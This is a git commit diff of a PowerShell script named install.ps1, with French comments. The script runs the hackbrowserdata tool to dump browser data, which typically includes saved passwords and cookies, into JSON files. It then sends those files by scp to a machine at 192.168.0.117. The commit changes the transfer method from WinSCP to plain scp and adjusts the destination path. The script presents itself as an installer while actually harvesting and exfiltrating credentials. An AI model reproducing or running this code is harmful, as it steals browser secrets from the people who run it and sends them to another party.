674a309d600fbbd7df8b5313b92d08f8d0a699e0
NONGNI GODA JOEL <joelduponddev@gmail.com>
2025-03-17 18:00:21 -0400

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,7 +1,7 @@
-# Variables 
+# Variables
 $serverUser = "DELL"
 $serverIP = "192.168.0.117"  # Remplace par l'IP du premier PC
-$destDir = "C:\Users\$serverUser\hackbrowserdata"  # Chemin correct pour Windows
+$destDir = "/home/$serverUser/hackbrowserdata"
 $localPath = "$env:USERPROFILE\hackbrowserdata"
 
 # Créer un dossier temporaire
@@ -20,19 +20,8 @@ Write-Output "[+] Extraction des données..."
 Set-Location $localPath
 Start-Process -NoNewWindow -FilePath ".\hackbrowserdata.exe" -ArgumentList "-o json" -Wait
 
-# Vérifier si WinSCP est installé (nécessaire pour SCP)
-if (!(Test-Path "C:\Program Files (x86)\WinSCP\WinSCP.com")) {
-    Write-Output "WinSCP non installé. Installation en cours..."
-    Invoke-WebRequest -Uri "https://winscp.net/download/WinSCP-5.21.5-Setup.exe" -OutFile "$env:TEMP\WinSCP-Setup.exe"
-    Start-Process -FilePath "$env:TEMP\WinSCP-Setup.exe" -ArgumentList "/SILENT" -Wait
-}
-
 # Transférer les fichiers via WinSCP (SCP)
 Write-Output "[+] Envoi des fichiers..."
-& "C:\Program Files (x86)\WinSCP\WinSCP.com" /command `
-    "open scp://$serverUser@$serverIP" `
-    "put $localPath\*.json $destDir" `
-    "exit"
+scp "$localPath\*.json" "$serverUser@$serverIP`:`$destDir"
 
-Write-Output "[+] Terminé ! Les fichiers sont sur $serverIP:$destDir"
-
+Write-Output "[+] Terminé ! Les fichiers sont sur $serverIP`:`$destDir"
